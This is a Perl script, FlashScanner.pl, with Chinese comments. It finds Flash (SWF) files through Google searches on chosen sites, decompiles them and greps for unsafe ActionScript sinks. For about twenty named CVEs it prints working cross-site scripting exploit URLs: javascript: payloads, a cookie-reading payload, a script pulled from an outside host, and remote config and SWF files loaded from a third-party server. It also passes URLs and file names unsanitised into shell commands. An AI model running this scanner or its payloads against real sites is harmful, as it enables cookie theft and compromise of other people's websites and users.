# !/url/bin/perl -w
# Name  : FlashScanner.pl V1.0
# Author: riusksk
# Blog  : http://riusksk.blogbus.com
# Date  : 2013-05-09

no  warnings;
use strict;
use LWP::UserAgent;
use Encode;
use URI::Escape;
use Getopt::Long;

my ($keyword, $page, $url, $file, $help);
my @result = ();

GetOptions(
    'g=s' => \$keyword,
    'p=s' => \$page,
    'u=s' => \$url,
    'f=s' => \$file,
    'h!' => \$help,
);

if(!defined $keyword && !defined $url && !defined $file || defined $help){
    &usage();
}

if(defined $keyword) {
    my @flashurls = &google();
    foreach my $flashurl(@flashurls){
        chomp($flashurl);
        if($flashurl){
            #print "链接：$flashurl\n";
            my $swfname = download($flashurl);
            #print "文件名：$swfname\n";
            if($swfname){
            	&audit($swfname, $flashurl);
            }
        }
    }
}

if(defined $url){
    my $swfname = download($url);
    &audit($swfname, $url);
}

if(defined $file){ 
    #print $file."\n";

    my @tmp = split(/\//,$file);
    my $swfname = pop(@tmp);
    #print $swfname."\n";
    `cp -f $file tmp/`; 

    &audit($swfname);
}

if(@result){
    print("[*] 共发现".@result."个漏洞:\n\n");
    print @result;
}
else{print "[*] 未发现漏洞！\n\n"};

sub usage(){
    print "\n";
    print "Usage:   perl\t FlashScanner.pl \n";
    print "\t -g\t Google 搜索语句 \n";
    print "\t -p\t 搜索结果的起始页数\n";
    print "\t -u\t 指定Flash网址\n";
    print "\t -f\t 本地swf文件路径\n";
    print "\t -h\t 帮助信息\n\n";
    print "Example: perl FlashScanner.pl -g \"site:qq.com filetype:swf inurl:player\" -p 1\n\n";
    exit;
}

sub google{
    
    my @urls = ();
    my @flashurls = ();
    my $flashurl = "";
    if ($page < 1){
        $page = 1;
    }
    my $start = 100 * ($page-1);
    
    # 通过google搜索swf文件
	my $ua = new LWP::UserAgent;
    $ua->agent("Mozilla/5.0 (X11; Linux i686; rv:2.0.0) Gecko/20130130");
    $ua->max_redirect( 0 );
    my $response = $ua->get( "http://www.google.com.au/search?hl=zh-CN&q=".$keyword."&num=100&start=".$start )
        or die ("[*] google请求失败，请重试！\n");
    #print $response->content."\n";
    my $content = $response->content;
    
    if($content=~/did\ not\ match/ig){
    	die("[*] 搜索不到相关信息!\n\n");
    }

    # 提取搜索结果中的swf文件链接
    @urls = split(/\/url\?q\=/,$content);
    delete $urls[0];
    foreach $flashurl(@urls){
        my @tmp = split(/\&amp\;/,$flashurl);
        $flashurl = $tmp[0];
        chomp($flashurl);
        $flashurl =~ /(.+?\.swf)/i;
        $flashurl = $1;
        #print "链接：$flashurl\n";
        push(@flashurls,$flashurl);
    }
    my %seen = ();
    @flashurls = grep(!$seen{$_}++ , @flashurls);  # 删除重复的文件地址
    return @flashurls;
}

sub download(){
    my $url = $_[0];
    print"[*] 下载文件中……\n";

    system("wget $url");
    system("mv *.swf tmp/");

    my @tmp = split(/\//,$url);
    my $swfname = pop(@tmp);
    $swfname = uri_unescape($swfname);
    #print "文件名：$swfname\n";

    if(open(FH,"tmp/$swfname")){
    	return $swfname;
    }
    else{
    	print("[*] 无法下载到文件，请重新测试！\n\n");
    	return 0;
    }

}

sub audit(){

    my @vulfuns = (
        "getURL",
        "URLRequest",
        "getURLBlankVar",
        "getURLParentVar",
        "getURLJSParam",
        "loadVariables",
        "loadMovie",
        "loadMovieVar",
        "loadMovieNum",
        "loadMovieNumVar",
        "FScrollPane.loadScrollContent",
        "LoadVars.load",
        "LoadVars.send",
        "XML.load",
        "XML.sendAndLoad",
        "Sound.loadSound",
        "NetStream.play",
        "ExternalInterface.call",
        "ExternalInterface.addCallback",
        "htmlText",
        "htmlVar",
        "navigateToURL",
        "loadClip",
        "addDLL"
    );

    my @source = (
            "_root.",
            "loaderInfo.parameters"
        );

    my $swfname = $_[0];
    my $flashurl = $_[1];

    print"[*] 反编译swf文件……\n";
    system("wine flare06doswin/flare.exe tmp/$swfname");

    my @tmp = split(/\.swf/, $swfname);
    my $flrname = $tmp[0].".flr";

    my $target = "";
    if($flashurl){
        $target = $flashurl; 
    }else{
        $target = $swfname;
    }

    # 由于flare不支持as3(flash 11)，可能会导致反编译错误，此时可转用 asdec 进行反编译

    if(`grep \'// unknown tag\' tmp/$flrname`){
        print "[*] Flare 反编译失败，重新使用 asdec 进行反编译……\n";
        `java -jar asdec/asdec.jar -export as "tmp/$tmp[0]/" tmp/$swfname`;
        &asdecAudit($tmp[0], $target);
        return;
    }

    #print $flrname."\n";
    print"[*] 检测代码中……\n";
    foreach my $vulfun (@vulfuns){
        my @grep = readpipe(" grep -n \'$vulfun\(\\\_root\\\.\' \"`pwd`/tmp/$flrname\" ");  # 检测_root全局变量
        my @param = readpipe("grep -n \'$vulfun\(\.parammeters\' \"`pwd`/tmp/$flrname\" "); # 检测loadInfo.parameters全局变量
        my @clickTag = readpipe("grep -n \'$vulfun\(clickTag\\\,\' \"`pwd`/tmp/$flrname\" ");     # 检测clickTag全局变量
        my @abc = readpipe("grep -n \'$vulfun\([a-zA-Z]\\\,\' \"`pwd`/tmp/$flrname\" ");
        push(@grep,@param);
        push(@grep,@clickTag);
        push(@grep,@abc);

        if(@grep){
            if($flashurl){
                push(@result,"【漏洞】$flashurl：\n@grep\n");
            }
            else{ push(@result,"【漏洞】（$swfname）：\n@grep\n");
            }
        }
    }

    # Macromedia Flash Detection Kit flash_detection.swf flashContentURL参数XSS漏洞
    my @flash_detection = readpipe("grep -n \'getURL\(flashContentURL\\\,\' \"`pwd`/tmp/$flrname\"");
    if(@flash_detection){
        my $exploit = "$target?flashContentURL=javascript:alert('xss')&altContentURL=http://www.google.com&.swf";
        push(@result, "【漏洞】【$target】：\n@flash_detection\n【Exploit】：\n$exploit\n\n");
    }

    # sIFR2 Font tradegothic.swf htmlText XSS
    my @font = readpipe("grep -n \'holder\.txtF\.htmlText = txt\' \"`pwd`/tmp/$flrname\"");
    if(@font){
        my $exploit = "$target?txt=<a href=\"javascript:confirm('xss')\">XSS!</a>&.swf";
        push(@result, "【漏洞】【$target】：\n@font\n【Exploit】：\n$exploit\n\n");
    }

    # CVE-2011-3641 sIFR3 cochin.swf Font version XSS
    my @cochin = readpipe("grep -n \'this\.textField\.htmlText = \\\[\' \"tmp/$flrname\" | grep content| grep sIFR");
    if(@cochin){
        my $exploit = "$target?version=<a href=\"javascript:alert('xss')\"><img src=\"http://appsec.ws/ExploitDB/cMon.jpg\"/><\/a><br\/><br\/><br\/>\<br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/><br\/>&.swf";
        push(@result, "【漏洞】【$target】：\n@cochin\n【Exploit】：\n$exploit\n\n");
    }

    # TechSmith Camtasia control.swf XSS
    my @csPreloader =  readpipe("grep -n \'loader\.loadClip\(csPreloader\,\' \"`pwd`/tmp/$flrname\" ");
    my @csConfigFile = readpipe("grep -n \'this\\\.loadXML\(file\)\' \"`pwd`/tmp/$flrname\" ");
    my @container = readpipe("grep -n \'container\\\.init\(csConfigFile\\\,\' \"`pwd`/tmp/$flrname\"");
    if(@csPreloader && @csConfigFile && @container){
        my $exploit = "$target?csPreloader=http://appsec.ws/ExploitDB/Configs/Camtasia/PoC_preload.swf&csConfigFile=http://appsec.ws/ExploitDB/Configs/Camtasia/PoC_config.xml&.swf";
        push(@result, "【漏洞】【$target】：\n@csPreloader\n@csConfigFile \t\tfuncion init\(file\, ploader\, bookmark\, contentpath\)\n @container\n【Exploit】：\n$exploit\n\n");
    }

    # FlowPlayer Flash XSS
    my @playlist = readpipe("grep -n \'getURL\(v2\,\' \"`pwd`/tmp/$flrname\" ");
    my @getLinkURL = readpipe("grep -n \'var v2 = \(this\.playList\.currentClip\(\)\)\.getLinkURL\(\)\' \"`pwd`/tmp/$flrname\" ");
    my @ret = readpipe("grep -n \'return this\.linkUrl\;\' \"`pwd`/tmp/$flrname\" ");
    my @linkUrl = readpipe("grep -n \'this\.linkUrl = linkUrl\' \"`pwd`/tmp/$flrname\"");
    my @isValid = readpipe("grep -n \'isValid\(linkUrl\)\' \"`pwd`/tmp/$flrname\"");
    if(@playlist && @getLinkURL && @ret && @linkUrl && !@isValid){
        my $exploit = "$target?config={playList: [{ url: \"http://stream.flowplayer.org/bauhaus/624x260.mp4\", linkUrl: \"javascript:confirm('xss')\"}]}&.swf";
        push(@result, "【漏洞】【$target】：\n @playlist @getLinkURL @ret @linkUrl\n【Exploit】：\n$exploit\n\n");
    }

    # Discuz 2.0/2.5 player.swf playerID XSS
    my @playerID = readpipe("grep -n getURL \"`pwd`/tmp/$flrname\" | grep javascript\:ap\_stopAll | grep playerID");
    if(@playerID){
    	my $exploit = "$target?playerID=);alert(1);function%20ap_stopAll()}//";
		push(@result, "【漏洞】【$target】：\n@playerID\n【Exploit】：\n$exploit\n\n");
    }

    # CVE-2011-3644 Flv Player player_flv_(classic|mini|maxi|multi).swf XSS
    my @flvplayer = readpipe("grep -n \"setVar\(\\\'\_onClick\\\'\" \"`pwd`/tmp/$flrname\" ");
    my @onclick = readpipe("grep -n \'getURL\(this\\\.\_onClick\,\' \"`pwd`/tmp/$flrname\" ");
    if(@flvplayer && @onclick){
    	my $exploit = "$target?flv=http://flv-player.net/medias/KyodaiNoGilga.flv&startimage=http://appsec.ws/ExploitDB/cMon.jpg&onclicktarget=_self&onclick=javascript:confirm('XSS');&ondoubleclick=http://www.google.com&.swf";
    	push(@result, "【漏洞】【$target】：\n @flvplayer @onclick\n【Exploit】：\n$exploit\n\n");
    }

    # CVE-2011-4549 open flash chart flash xss
    my @data = readpipe("grep -n \'var lv \= new LoadVars\(\)\' `pwd`/tmp/$flrname");
    my @load = readpipe("grep -n \'lv\.load\(\_root\.data\)\' `pwd`/tmp/$flrname");
    if(@data && @load){
    	my $exploit = "$target?data=http://appsec.ws/ExploitDB/Configs/openChart/openChart.php&.swf";
    	push(@result, "【漏洞】【$target】：\n\n @data @load\n【Exploit】：\n$exploit\n\n" );
    }
    
    # CVE-2012-1303 amcharts flash xss
    my @amdata = readpipe("grep -n \'new\_data\_file \= data\_file\' `pwd`/tmp/$flrname");
    my @amload = readpipe("grep -n \'v2\\\.loadXML\(new\_data\_file\' `pwd`/tmp/$flrname");
    my @coldata = readpipe("grep -n \'parseXML\(new XML\(chart\_data\)\)\' `pwd`/tmp/$flrname");
    my @colload = readpipe("grep -n \"externalCall(\'returnData\" `pwd`/tmp/$flrname");
    my @stockload = readpipe("grep -n \'v2\\\.loadXML\(new\_settings\_file\' `pwd`/tmp/$flrname");
    my @stockdata = readpipe("grep -n \'loadSettingsXML\(settings\_file\_array\\\[0\\\]\)\' `pwd`/tmp/$flrname");
    my @setfile = readpipe("grep -n \'settings\_file\_array \= settings\_file\.split\(\' `pwd`/tmp/$flrname");

    if (@amdata && @amload && @colload && @coldata && @stockdata && @stockload && @setfile) {
        my $exploit = "ampie.swf?settings_file=http://appsec.ws/ExploitDB/Configs/amCharts/2d-pie-chart.xml&data_file=http://appsec.ws/ExploitDB/Configs/amCharts/2d-pie-chart.txt&.swf\n\n".
                      "amline.swf | amxy.swf | amcolumn.swf | amradar.swf".
                      "?chart_settings=<settings></settings>&chart_data=<chart><message><![CDATA[<a href=\"javascript:alert('xss')\">XSS ~ Click Me!</a>]]></message></chart>&.swf\n".
                      "amstock.swf?settings_file=http://appsec.ws/ExploitDB/Configs/amCharts/amstock_settings.xml&.swf\n";
        push(@result, "【漏洞】【$target】：\n\n @amload @amdata\n @coldata @colload\n @stockdata @stockload @setfile\n【Exploit】：\n$exploit\n");

    }

    # CVE-2008-6060 FusionCharts Suite dataURL Flash XSS
    my @xmlData = readpipe("grep -n \'this\.xmlData \= new XML\(\)\' `pwd`/tmp/$flrname");
    my @getData = readpipe("grep -n \'var v2 \= getFilteredDataURL\(rootAttr\.dataurl\)\' `pwd`/tmp/$flrname");
    my @xmlload = readpipe("grep -n \'xmlData.load(v2)\' `pwd`/tmp/$flrname");
    if(@xmlData && @getData && @xmlload){
    	my $exploit = "Single Series：\nPie3D.swf?dataURL=http://appsec.ws/ExploitDB/Configs/FusionCharts/SSconfig.xml&.swf\n".
    				  "Multi-Series：\nMSLine.swf?dataURL=http://appsec.ws/ExploitDB/Configs/FusionCharts/MSconfig.xml&.swf\n".
    				  "XY Plot：\nBubble.swf?dataURL=http://www.appsec.ws/ExploitDB/Configs/FusionCharts/XYconfig.xml&.swf\n".
    				  "Map：\nFCMap_World.swf?dataURL=http://www.appsec.ws/ExploitDB/Configs/FusionCharts/MapConfig.xml&.swf\n";
    	push(@result, "【漏洞】【$target】：\n\n @xmlData @getData @xmlload\n【Exploit】：\n$exploit\n");
    }

    # CVE-2012-1504 FusionCharts Suite dataXML Flash XSS
    my @parseXML = readpipe("grep -n \'xmlData\.parseXML\(rootAttr\.dataxml\)\' `pwd`/tmp/$flrname");
    my @setRawXML = readpipe("grep -n \'chart\.setRawXMLString\(rootAttr\.dataxml\)\' `pwd`/tmp/$flrname");
    if( @parseXML && @setRawXML){
    	my $exploit = "Single Series：\nPie3D.swf?dataXML=<chart lineColor='FF0000' clickURL=\"javascript:confirm('xss')\" caption='Fusion Charts - Line' subcaption=\"Vulnerability Proof of Concept\" showValues='1' showLabels='1' showLegend='1'><categories><category label='Jan' /><category label='Feb' /><category label='Mar' /></categories><set value='1'/><set value='1337' link=\"javascript:confirm('xss')\"/><set value='1' /></chart>&.swf\n\n".
    				  "Multi-Series：\nMSLine.swf?dataXML=<chart clickURL=\"javascript:confirm('xss')\" caption='Fusion Charts – Multi-Series' subcaption=\"Vulnerability Proof of Concept\" showValues='1' showLabels='1' showLegend='1'><categories><category label='Jan' /><category label='Feb' /><category label='Mar' /></categories><dataset seriesName='Current Year' color='008080'><set value='1'/><set value='1337' link=\"javascript:confirm('xss')\"/><set value='1' /></dataset><dataset seriesName='Previous Year' color='FF0000'><set value='1337' /><set value='1' link='http://www.google.com'/><set value='1337' /></dataset></chart>&.swf\n\n".
    				  "XY Plot：\nBubble.swf?dataXML=<chart clickURL=\"javascript:confirm('xss')\" caption='Fusion Charts - XY Plot' subcaption=\"Vulnerability Proof of Concept\" xAxisName='Price' yAxisName='Original Cost'><categories verticalLineColor='666666' verticalLineAlpha='20'><category label='0' x='0' /><category label='5' x='5' sL='1'/><category label='10' x='10' sL='1'/><category label='15' x='15' sL='1'/><category label='20' x='20' sL='1'/></categories><dataSet color='ff5904' seriesName='1996' showValues='0'><set x='12' y='17' z='80' name='URL Redirection' link='http://www.google.com'/><set x='16' y='30' z='105' name='XSS!' link=\"javascript:confirm('xss')\"/></dataSet><dataSet color='4371AB' seriesName='1997' ><set x='2' y='12' z='80' name='URL Redirection' link='http://www.google.com'/><set x='12' y='15' z='105' name='XSS!' link=\"javascript:confirm('xss')\"/></dataSet></chart>&.swf\n\n";
    	push( @result, "【漏洞】【$target】：\n\n @parseXML @setRawXML\n【Exploit】：\n$exploit\n");
    }

}

sub asdecAudit(){
    my @vulfuns = (
        "getURL",
        "URLRequest",
        "getURLBlankVar",
        "getURLParentVar",
        "getURLJSParam",
        "loadVariables",
        "loadMovie",
        "loadMovieVar",
        "loadMovieNum",
        "loadMovieNumVar",
        "FScrollPane.loadScrollContent",
        "LoadVars.load",
        "LoadVars.send",
        "XML.load",
        "XML.sendAndLoad",
        "Sound.loadSound",
        "NetStream.play",
        "ExternalInterface.call",
        "ExternalInterface.addCallback",
        "htmlText",
        "htmlVar",
        "navigateToURL",
        "loadClip",
        "addDLL"
    );

    my @source = (
            "_root.",
            "loaderInfo.parameters"
        );
    
	my $name =  $_[0];
	my $target = $_[1];
	#print "漏洞文件：".$target."\n";

	# 检测引用全局变量导致的漏洞
    foreach my $vulfun (@vulfuns){
        my @grep = readpipe(" grep -n \'$vulfun\(\\\_root\\\.\' \-R tmp/$name/ ");  # 检测_root全局变量
        my @param = readpipe("grep -n \'$vulfun\(\.parammeters\' -R tmp/$name/ "); # 检测loadInfo.parameters全局变量
        my @clickTag = readpipe("grep -n \'$vulfun\(clickTag\\\,\' -R tmp/$name/ ");     # 检测clickTag全局变量
        push(@grep,@param);
        push(@grep,@clickTag);

        if(@grep){           
            push(@result,"【漏洞】【$target】：\n@grep\n");
        }
    }


	# Longtail JW Player mediaplsyer.swf XSS
	my @link = readpipe("grep -n \'getUrl\(this\.feeder\.feed\\\[idx\\\]\.link\' -R tmp/$name/ ");
	if(@link){
		my $exploit = "$target?file=http://content.bitsontherun.com/videos/bkaovAYt-364766.flv&autostart=false&image=http://appsec.ws/ExploitDB/cMon.jpg&linkfromdisplay=true&link=javascript:confirm%28%27XSS%27%29;//&linktarget=_blank&.swf";
		push(@result, "【漏洞】【$target】：\n@link\n【Exploit】：\n$exploit\n\n");
	}

	my @debug = readpipe("grep -n \'ExternalInterface\.call\(\_config\.debug\,\' -R tmp/$name/ ");
	if(@debug){
		my $exploit = "$target#?debug=%28function%28%29%7Blocation.href%3D%27javascript%3A%22%3Cscript%2fsrc%3D%5C%27%2f%2fha.ckers.org%2fxss.js%5C%27%3E%3C%2fscript%3E%22%27%7D%29";
		push(@result, "【漏洞】【$target】：\n@debug\n【Exploit】：\n$exploit\n\n");
	}

    # CVE-2011-2413 Longtail JW Player player.swf XSS
    my @linkparm = readpipe("grep -n \'navigateToURL\(new\ URLRequest\(this\.\_player\.playlist\.getItemAt\(param1\)\.link\)\' -R tmp/$name/");
    if(@linkparm){
    	my $exploit = "$target#?file=http://content.bitsontherun.com/videos/bkaovAYt-364766.flv&autostart=false&image=http://appsec.ws/ExploitDB/cMon.jpg&displayclick=link&link=javascript:javascript:confirm('xss');//&linktarget=_self&.swf";
    	push(@result, "【漏洞】【$target】：\n@linkparm\n【Exploit】：\n$exploit\n\n");
    }

    my @link1 = readpipe("grep -n \'navigateToURL\(new\ URLRequest\(Strings\.cleanLink\(this\.\_player\.playlist\.getItemAt\(param1\)\.link\)\' -R tmp/$name/");
    if(@link1){
    	my $exploit = "$target?file=http://content.bitsontherun.com/videos/bkaovAYt-364766.flv&autostart=false&image=http://appsec.ws/ExploitDB/cMon.jpg&displayclick=link&link=javajavascript:script:confirm('XSS');//&linktarget=_self&.swf\n";
    	$exploit .= "或者：\n<iframe name=\"javascript:alert(1)\" src=\"$target?playerReady=document.location=window.name%2b%27//%27%2b\>\<\/iframe\>";
    	push(@result, "【漏洞】【$target】：\n@link1\n【Exploit】：\n$exploit\n\n");
    }

    # CVE-2012-1302 amMap flash xss
    my @datafile = readpipe("grep -n \'\_loc2\.loadXML\(new\_data\_file\,\' -R tmp/$name/");
    my @setfile = readpipe("grep -n \'\_loc2\.loadXML\(new_settings\_file\,\' -R tmp/$name/");
    if (@datafile || @setfile) {
    	my $exploit = "$target#?path=&data_file=http://www.appsec.ws/ExploitDB/Configs/amMap/ammap_data.xml&settings_file=http://www.appsec.ws/ExploitDB/Configs/amMap/ammap_settings.xml&.swf";
    	push(@result, "【漏洞】【$target】：\n@datafile\n@setfile【Exploit】：\n$exploit\n\n");
    }

    # CVE-2012-2399 swfupload movieName flash xss
    my @movieName = readpipe("grep -n \'this\.movieName\=root\.loaderInfo\.parameters\.movieName\' -R tmp/$name/");
    my @callback = readpipe("grep -n \'flashReady_Callback=\"SWFUpload.instances\\\[\\\\\"\"\+this\.movieName\' -R tmp/$name/");
    my @simple = readpipe("grep -n \'ExternalCall\.Simple\(this\.flashReady\_Callback\)\' -R tmp/$name/");
    my @call =  readpipe("grep -n \'ExternalInterface\.call\(param1\)\' -R tmp/$name/");
    if (@movieName && @callback && @simple && @call) {
    	my $exploit = "$target?movieName=\"])}catch(e){if(!window.x){window.x=1;confirm('XSS')}}//&.swf";
		push(@result, "【漏洞】【$target】：\n @movieName @callback @simple @call\n【Exploit】：$exploit\n\n");
    }

    # CVE-2009-4169 WP-Cumulus Flash xss
    my @myXML = readpipe("grep -n \'myXML\=new XML\(this\.loaderInfo\.parameters\.tagcloud\)\;\' -R tmp/$name/");
    my @init = readpipe("grep -n \'init\(myXML\)\' -R tmp/$name/");
    my @each = readpipe("grep -n \'for each \(\_loc5\_ in param1\.a\)\' -R tmp/$name/");
    my @tag = readpipe("grep -n \'\=new Tag\(\_loc5\_\,\' -R tmp/$name/");
    my @child = readpipe("grep -n \'holder\.addChild\(\_loc\' -R tmp/$name");
    my @mclist = readpipe("grep -n \'mcList\.push\(\_loc\' -R tmp/$name/");
    my @movieclip = readpipe("grep -n \'holder\=new MovieClip\(\)\' -R tmp/$name/");
    if(@myXML && @init && @each && @tag && @child && @mclist && @movieclip){
        my $exploit = "$target#?mode=tags&tagcloud=<tags><a href=\"javascript:alert('xss')\" rel=\"tag\" style=\"font-size:16pt;\">XSS! </a><a href=\"http://www.google.com\" rel=\"tag\" style=\"font-size:16pt;\">URL Redirection</a></tags>&.swf";
        push(@result, "【漏洞】【$target】：\n@myXML @init @each @tag @child @mclist @movieclip\n【Exploit】：\n$exploit\n\n");
    }  

    # CVE-2009-4168 WP-Cumulus Flash xss
    my @xmlpath = readpipe("grep -n \'XMLPath\=this\.loaderInfo\.parameters\.xmlpath\' -R tmp/$name/");
    my @request = readpipe("grep -n \'myXMLReq\=new URLRequest\(XMLPath\)\;\' -R tmp/$name/");
    my @myloader = readpipe("grep -n \'myLoader\=new URLLoader\(myXMLReq\)\;\' -R tmp/$name/");
    if(@xmlpath && @request && @myloader){
        my $exploit = "$target?xmlpath=http://appsec.ws/ExploitDB/Configs/wp-cumulus_1.22/cumulus.xml&.swf";
        push(@result, "【漏洞】【$target】：\n @xmlpath @request @myloader\n【Exploit】：$exploit\n\n");
    } 

    # CVE-2012-1505 AnyChart flash xss
    # my @version = readpipe("grep -n \'Version #6.0.6\' -R tmp/$name");
    my @xmlfile = readpipe("grep -n \'this\.chart\.xmlFilePath\=xmlFile\' -R tmp/$name");
    my @setXMLData = readpipe("grep -n \'this\.setXMLData\(ResourcesHashMap\.getText\(this\.xmlFilePath\)\' -R tmp/$name");
    my @processxml = readpipe("grep -n \'var \_loc2\_\:XML \= super\.processXML\(param1\)\' -R tmp/$name");
    my @generateChart = readpipe("grep -n \'this\.generateChart\(\_loc2\_\)\' -R tmp/$name" );
    if(@xmlfile && @setXMLData && @processxml && @generateChart){
    	my $exploit = "$target?xmlpath=http://appsec.ws/ExploitDB/Configs/wp-cumulus_1.22/cumulus.xml&.swf";
    	push(@result, "【漏洞】【$target】：\n@xmlfile @setXMLData @processxml @generateChart\n 【Exploit】：\n$exploit\n\n");
    }

    # CVE-2012-2228 JPlayer flash xss
    my @jquery =  readpipe("grep -n \'this\.jQuery\=loaderInfo\.parameters\.jQuery\+\"\(\' -R tmp/$name");
    my @externalCall = readpipe("grep -n \'ExternalInterface\.call\(this\.jQuery\,\' -R tmp/$name");
    if(@jquery && @externalCall){
    	my $exploit = "$target?jQuery=confirm&id=xss%27)*confirm(document.cookie%2b'&vol=0.8&muted=false&.swf";
    	push(@result, "【漏洞】【$target】：\n @jquery @externalCall\n【Exploit】：$exploit\n\n");
    }
}


